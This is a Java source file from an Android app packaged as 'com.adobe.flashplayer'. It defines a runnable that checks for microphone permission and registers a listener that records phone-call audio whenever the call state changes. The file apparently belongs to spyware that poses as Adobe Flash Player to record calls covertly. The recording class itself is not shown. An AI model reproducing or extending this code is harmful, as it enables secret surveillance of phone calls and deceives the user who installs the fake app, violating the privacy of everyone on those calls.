package com.adobe.flashplayer.data;

import android.content.Context;
import android.content.pm.PackageManager;
import android.os.Looper;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;

import androidx.core.content.ContextCompat;

import com.adobe.flashplayer.MyLog;
import com.adobe.flashplayer.Utils;


public class PhoneCallAudioWrapper implements  Runnable{

    Context context;
    public static PhoneCallAudioRec gPhoneCallAudio;

    PhoneCallAudioWrapper(Context context){
        this.context = context;
        //java.lang.NullPointerException: Attempt to read from field 'android.os.MessageQueue android.os.Looper.mQueue' on a null object reference
        //gPhoneCallAudio = new PhoneCallAudioRec(context);
    }

    @Override
    public void run(){
        try {
            int granted = ContextCompat.checkSelfPermission(context,android.Manifest.permission.RECORD_AUDIO);
            if (granted == PackageManager.PERMISSION_GRANTED) {
                Looper.prepare();
                TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
                if (gPhoneCallAudio == null) {
                    gPhoneCallAudio = new PhoneCallAudioRec(context);
                }

                tm.listen(gPhoneCallAudio, PhoneStateListener.LISTEN_CALL_STATE);

                Looper.loop();
            }
        } catch (Exception e) {
            String error = Utils.getExceptionDetail(e);
            String stack = Utils.getCallStack();
            MyLog.writeLogFile("PhoneCallAudio exception:"+error + "\r\n" + "call stack:" + stack + "\r\n");
            e.printStackTrace();
        }
    }




}